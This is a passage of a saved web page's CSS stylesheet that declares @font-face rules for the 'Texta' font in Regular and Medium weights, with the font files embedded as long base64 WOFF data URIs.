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) format('woff'), /* Modern Browsers */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Regular/Texta-Regular.ttf*/ url() format('truetype'), /* Safari, Android, iOS */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Regular/Texta-Regular.svg#Texta-Regular*/ url() format('svg'); /* Legacy iOS */
    font-style: normal;
    font-weight: 500;
    text-rendering: optimizeLegibility;
}



/* END Regular */


/* BEGIN Medium */
/*
@font-face {
    font-family: 'Texta';
    src: url("/risorseweb/poste_it/risorseweb/poste_it/risorse_dt/condivise/fonts/texta/Texta-Medium.otf");
    font-style: normal;
    font-weight: 600;
}
*/
@font-face {
    font-family: 'Texta';
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Medium/Texta-Medium.eot*/ url(); /* IE9 Compat Modes */
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Medium/Texta-Medium.eot?#iefix*/ url() format('embedded-opentype'), /* IE6-IE8 */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Medium/Texta-Medium.woff*/ url(data:application/font-woff;base64,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